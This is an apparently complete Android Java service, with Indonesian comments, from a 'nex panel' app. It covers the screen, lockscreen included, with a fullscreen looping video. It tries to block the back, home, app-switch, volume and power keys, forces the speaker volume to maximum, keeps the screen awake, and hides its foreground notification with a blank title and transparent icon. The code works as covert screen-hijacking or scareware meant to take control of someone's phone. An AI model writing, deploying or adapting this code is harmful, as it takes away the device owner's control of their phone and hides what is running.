package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.FrameLayout;

import androidx.core.app.NotificationCompat;

public class VideoOverlayService extends Service implements SurfaceHolder.Callback {

    private static final String TAG      = "VideoOverlayService";
    private static final String CHANNEL  = "nex_video_overlay";
    private static final int    NOTIF_ID = 9991;

    public static final String ACTION_SHOW_VIDEO = "com.nex.panel.ACTION_SHOW_VIDEO";
    public static final String ACTION_STOP_VIDEO = "com.nex.panel.ACTION_STOP_VIDEO";

    private WindowManager   wm;
    private FrameLayout     overlayRoot;
    private SurfaceView     surfaceView;
    private MediaPlayer     mediaPlayer;
    private PowerManager.WakeLock wakeLock;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());

    // ── onCreate ─────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_SHOW_VIDEO.equals(action)) {
            uiHandler.post(this::showVideoOverlay);
        } else if (ACTION_STOP_VIDEO.equals(action)) {
            uiHandler.post(this::stopVideoOverlay);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Tampilkan overlay video fullscreen ───────────────────────────────
    private void showVideoOverlay() {
        try {
            // Kalau sudah ada overlay, hapus dulu
            stopVideoOverlay();

            // Root FrameLayout hitam fullscreen
            FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(Color.BLACK);
            root.setFocusable(true);
            root.setFocusableInTouchMode(true);
            // Blokir semua key tombol hardware
            root.setOnKeyListener((v, keyCode, event) ->
                keyCode == KeyEvent.KEYCODE_BACK        ||
                keyCode == KeyEvent.KEYCODE_HOME        ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP   ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_POWER
            );

            // SurfaceView untuk video
            SurfaceView sv = new SurfaceView(this);
            sv.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ));
            root.addView(sv);

            overlayRoot = root;
            surfaceView = sv;

            // Daftarkan callback surface — MediaPlayer diinisialisasi setelah surface siap
            sv.getHolder().addCallback(this);

            // WindowManager params — overlay diatas semua app termasuk lockscreen
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN  |
                WindowManager.LayoutParams.FLAG_FULLSCREEN         |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED   |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD   |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON     |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON     |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, params);

            // Paksa layar tetap ON via WakeLock
            acquireWakeLock();

            Log.d(TAG, "Video overlay added to WindowManager");

        } catch (Exception e) {
            Log.e(TAG, "showVideoOverlay error: " + e.getMessage());
        }
    }

    // ── SurfaceHolder.Callback — surface siap, inisialisasi MediaPlayer ──
    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            if (mediaPlayer != null) {
                mediaPlayer.release();
                mediaPlayer = null;
            }
            mediaPlayer = new MediaPlayer();

            // Set audio agar video berbunyi keras via speaker
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                AudioAttributes aa = new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
                    .build();
                mediaPlayer.setAudioAttributes(aa);
            } else {
                mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            }

            // Paksa volume speaker ke max
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                    0
                );
                am.setSpeakerphoneOn(true);
            }

            // Load video dari assets
            AssetFileDescriptor afd = getAssets().openFd("overlay_video.mp4");
            mediaPlayer.setDataSource(
                afd.getFileDescriptor(),
                afd.getStartOffset(),
                afd.getLength()
            );
            afd.close();

            // Pasang surface dan looping
            mediaPlayer.setDisplay(holder);
            mediaPlayer.setLooping(true);       // video diulang terus sampai stop
            mediaPlayer.setVideoScalingMode(MediaPlayer.VIDEO_SCALING_MODE_SCALE_TO_FIT_WITH_CROPPING);
            mediaPlayer.setScreenOnWhilePlaying(true);

            // Callback error
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "MediaPlayer error: what=" + what + " extra=" + extra);
                return true;
            });

            // Siapkan lalu play
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> {
                mp.start();
                Log.d(TAG, "Video started playing");
            });

        } catch (Exception e) {
            Log.e(TAG, "surfaceCreated error: " + e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseMediaPlayer();
    }

    // ── Hentikan dan hapus overlay video ─────────────────────────────────
    private void stopVideoOverlay() {
        try {
            releaseMediaPlayer();

            if (overlayRoot != null && wm != null) {
                try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
                overlayRoot = null;
                surfaceView  = null;
            }

            releaseWakeLock();
            Log.d(TAG, "Video overlay stopped");

        } catch (Exception e) {
            Log.e(TAG, "stopVideoOverlay error: " + e.getMessage());
        }
    }

    private void releaseMediaPlayer() {
        try {
            if (mediaPlayer != null) {
                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
                mediaPlayer.release();
                mediaPlayer = null;
            }
        } catch (Exception ignored) {}
    }

    // ── WakeLock ──────────────────────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:VideoOverlay"
                );
                wakeLock.acquire(30 * 60 * 1000L); // max 30 menit
            }
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock error: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ── onDestroy ─────────────────────────────────────────────────────────
    @Override
    public void onDestroy() {
        uiHandler.post(this::stopVideoOverlay);
        super.onDestroy();
    }

    // ── Notification channel (wajib Android 8+) ───────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Video Overlay", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "Create channel error: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
